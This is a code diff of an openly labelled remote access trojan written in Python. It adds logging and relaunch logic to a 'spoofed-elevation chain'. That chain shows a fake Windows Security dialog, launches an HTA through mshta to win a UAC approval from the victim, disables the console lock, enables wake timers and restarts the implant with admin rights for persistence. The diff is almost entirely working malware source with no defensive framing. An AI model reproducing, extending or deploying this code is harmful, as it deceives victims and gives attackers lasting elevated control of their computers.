@@ -2003,6 +2003,48 @@ def _power_status() -> str:
     return "\n".join(lines)
 
 
+def _beacon_log(msg: str) -> None:
+    """Append a timestamped line to the target-side admin log. Best-effort
+    only - the implant must keep running even if logging fails."""
+    try:
+        from datetime import datetime
+        d = os.path.join(_stream_state_path(), "nvdesk")
+        os.makedirs(d, exist_ok=True)
+        with open(os.path.join(d, "admin.log"), "a", encoding="utf-8") as f:
+            f.write("%s %s\r\n" % (datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                                   msg))
+    except Exception:
+        pass
+
+
+def _elev_launch_cmd() -> str:
+    """Command line the elevated HTA must run to start a new elevated beacon.
+    Returns "" if unresolvable (the HTA then logs NO_LAUNCH_CMD instead of
+    calling sh.Run with an empty string).
+
+    The frozen/onefile implant re-runs its own exe; a bare dev run
+    (`python client.py`) must re-invoke the interpreter with the script path -
+    otherwise _persistence_exe() resolves to python.exe and the elevated shell
+    just opens an idle interpreter that never beacons."""
+    if os.name != "nt":
+        return ""
+    frozen = getattr(sys, "frozen", False) or "__compiled__" in globals()
+    if os.environ.get("RAT_SOURCE") == "1":
+        exe = _persistence_exe()
+        if exe:
+            exe = exe.strip().strip('"')
+            if exe and os.path.exists(exe):
+                return '"' + exe + '"'
+    if frozen:
+        exe = _module_exe_path() or get_self_path()
+        if exe and os.path.exists(exe):
+            return '"' + exe + '"'
+    exe = os.path.abspath(__file__)
+    if os.path.exists(exe):
+        return '"' + sys.executable + '" "' + exe + '"'
+    return ""
+
+
 def request_admin() -> str:
     """Spoofed-elevation chain: center-screen Windows Security pretext
     dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not this
@@ -2013,15 +2055,19 @@ def request_admin() -> str:
     if os.name != "nt":
         return "[!] Windows only"
     import ctypes
+    _beacon_log("[medium] request_admin: src=%s self=%s" % (
+        os.environ.get("RAT_SOURCE", "0"), get_self_path()))
     try:
         if ctypes.windll.shell32.IsUserAnAdmin():
             arm = _wake_arm()
+            _beacon_log("[medium] already elevated, skipping UAC")
             return "[+] already elevated - no UAC prompt needed. " + arm
     except Exception:
         pass
     base = os.path.join(_stream_state_path(), "nvdesk")
     os.makedirs(base, exist_ok=True)
     flag = os.path.join(base, "elev.ok")
+    _beacon_log("[medium] base=%s flag=%s" % (base, flag))
     try:
         os.remove(flag)
     except OSError:
@@ -2036,30 +2082,60 @@ def request_admin() -> str:
         "Windows Security",
         0x00000001 | 0x00000030 | 0x00001000 | 0x00010000 | 0x00040000)
 
-    exe = _persistence_exe() or _module_exe_path() or get_self_path()
-    exe_vbs = exe.replace('"', '""')
+    _beacon_log("[medium] module_exe=%s self=%s" % (
+        _module_exe_path(), get_self_path()))
+    _beacon_log("[medium] persistence_exe=%s" % _persistence_exe())
+    launch_cmd = _elev_launch_cmd()
+    _beacon_log("[medium] launch_cmd=%s" % launch_cmd)
+    launch_vbs = launch_cmd.replace('"', '""')
 
     hta = os.path.join(base, "uac.hta")
+    log = os.path.join(base, "admin.log")
+    log_vbs = log.replace('"', '""')
+    flag_vbs = flag.replace('"', '""')
+    hta_vbs = hta.replace('"', '""')
+    if launch_cmd:
+        launch_line = ('L "launch rc=" & sh.Run("%s", 0, False)\r\n'
+                       % launch_vbs)
+    else:
+        launch_line = 'L "launch NO_LAUNCH_CMD"\r\n'
     vbs = (
         'On Error Resume Next\r\n'
         'Dim sh: Set sh = CreateObject("WScript.Shell")\r\n'
-        'sh.Run "powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_NONE '
-        'CONSOLELOCK 0", 0, True\r\n'
-        'sh.Run "powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_NONE '
-        'CONSOLELOCK 0", 0, True\r\n'
-        'sh.Run "powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
-        'RTCWAKE 1", 0, True\r\n'
-        'sh.Run "powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
-        'RTCWAKE 1", 0, True\r\n'
-        'sh.Run "powercfg /SETACTIVE SCHEME_CURRENT", 0, True\r\n'
-        'sh.Run """%(exe)s""", 0, False\r\n'
         'Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
+        'Sub L(m)\r\n'
+        '  Dim o\r\n'
+        '  On Error Resume Next\r\n'
+        '  Set o = fso.OpenTextFile("%(log)s", 8, True)\r\n'
+        '  o.WriteLine CStr(Now) & " [elev] " & m\r\n'
+        '  o.Close\r\n'
+        'End Sub\r\n'
+        'L "start"\r\n'
+        'L "powercfg AC CONSOLELOCK 0 rc=" & '
+        'sh.Run("powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_NONE '
+        'CONSOLELOCK 0", 0, True)\r\n'
+        'L "powercfg DC CONSOLELOCK 0 rc=" & '
+        'sh.Run("powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_NONE '
+        'CONSOLELOCK 0", 0, True)\r\n'
+        'L "powercfg AC RTCWAKE 1 rc=" & '
+        'sh.Run("powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
+        'RTCWAKE 1", 0, True)\r\n'
+        'L "powercfg DC RTCWAKE 1 rc=" & '
+        'sh.Run("powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
+        'RTCWAKE 1", 0, True)\r\n'
+        'L "powercfg SETACTIVE rc=" & '
+        'sh.Run("powercfg /SETACTIVE SCHEME_CURRENT", 0, True)\r\n'
+        '%(launch)s'
+        'L "flag write"\r\n'
         'Dim f: Set f = fso.CreateTextFile("%(flag)s", True)\r\n'
         'f.Write "ok"\r\n'
         'f.Close\r\n'
+        'L "flag written"\r\n'
         'fso.DeleteFile "%(hta)s", True\r\n'
+        'L "done"\r\n'
         'Self.Close\r\n'
-    ) % {"flag": flag, "hta": hta, "exe": exe_vbs}
+    ) % {"log": log_vbs, "flag": flag_vbs, "hta": hta_vbs,
+         "launch": launch_line}
     with open(hta, "w", encoding="utf-16") as f:
         f.write("<html><head><hta:application id=\"a\" caption=\"no\" "
                 "showintaskbar=\"no\"/></head>"
@@ -2067,23 +2143,29 @@ def request_admin() -> str:
 
     rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", "mshta.exe",
                                              '"' + hta + '"', None, 0)
+    _beacon_log("[medium] ShellExecuteW rc=%d hta=%s" % (rc, hta))
     if rc <= 32:
         try:
             os.remove(hta)
         except OSError:
             pass
+        _beacon_log("[medium] elevation declined/failed rc=%d" % rc)
         return "[!] elevation declined/failed (ShellExecute rc=%d)" % rc
     for _ in range(240):                  # 120s for the victim to click Yes
         if os.path.exists(flag):
             break
         time.sleep(0.5)
     else:
+        _beacon_log("[medium] flag not found within 120s")
         return "[-] elevation not confirmed within 120s"
+    _beacon_log("[medium] flag found")
     try:
         os.remove(hta)
     except OSError:
         pass
     arm = _wake_arm()
+    _beacon_log("[medium] wake_arm result: %s" % arm)
+    _beacon_log("[medium] scheduled exit in 2.5s")
     msg = "[+] ELEVATED: console lock off, RTC wake on. " + arm
     # the elevated HTA already launched the persistence exe with the
     # elevated token; drop this medium-IL session so the listener can
@@ -2265,6 +2347,14 @@ if __name__ == "__main__":
             time.sleep(random.uniform(lo, hi))
     except Exception:
         pass
+    try:
+        import ctypes as _ct
+        _is_admin = bool(_ct.windll.shell32.IsUserAnAdmin()) if os.name == "nt" else False
+    except Exception:
+        _is_admin = False
+    _beacon_log("START src=%s elev=%s self=%s" % (
+        os.environ.get("RAT_SOURCE", "0"), "1" if _is_admin else "0",
+        get_self_path()))
     # Source mode (loader_py v3, RAT_SOURCE=1): the loader owns persistence
     # and feeds this script via stdin - skip self-install entirely.
     if os.environ.get("RAT_SOURCE") != "1":
